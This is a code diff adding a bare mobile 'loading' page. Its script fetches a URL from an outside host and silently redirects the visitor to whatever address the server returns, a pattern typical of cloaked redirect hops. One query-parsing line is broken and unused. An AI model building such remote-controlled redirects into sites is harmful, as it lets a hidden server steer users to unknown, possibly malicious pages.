@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>loading</title>
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0,viewport-fit=cover"/>
+    <meta name="format-detection" content="telephone=no">
+    <meta name="applicable-device" content="mobile">
+    <style>body {height: 100%;background: #333;}</style>
+</head>
+<body>
+<script>
+    function getData(url, success, fail) {
+        var XHR = new XMLHttpRequest();
+        XHR.onreadystatechange = function () {
+            if (XHR.readyState !== 4) return;
+            if (XHR.status === 200 || XHR.status === 304) {
+                if (typeof success === 'function') success(XHR.responseText);
+            } else {
+                if (typeof fail === 'function') fail(XHR);
+            }
+        }
+        XHR.open('GET', url, true);
+        XHR.send(null);
+    }
+    var qs = window.location.href.split("#")[0].slice("?")[1]
+    getData("http://api.psxmingyun.cn/5",function (res) {
+        window.location.href = res
+    })
+</script>
+</body>
+</html>
